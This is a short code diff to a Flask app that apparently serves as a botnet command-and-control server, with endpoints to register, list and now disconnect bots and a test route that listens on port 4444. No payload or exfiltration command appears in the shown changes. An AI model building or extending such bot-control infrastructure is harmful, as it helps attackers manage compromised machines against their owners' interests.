@@ -2,6 +2,7 @@
 
 from flask import Flask, request
 import socket
+import threading
 import json
 
 app = Flask(__name__)
@@ -33,7 +34,7 @@ def test():
     data = listner(system_ip, 4444)
     return data
 
-@app.route('/register_bot')
+@app.route('/bot_register')
 def register_bot():
     bot_name = request.args.get('bot_name')
     bot_ip = request.args.get('bot_ip')
@@ -43,3 +44,9 @@ def register_bot():
 @app.route('/bot_list')
 def bot_list():
     return bot_dict
+
+@app.route('/bot_disconnect')
+def bot_disconnect():
+    bot_name = request.args.get('bot_name')
+    del bot_dict[bot_name]
+    return "200 OK"
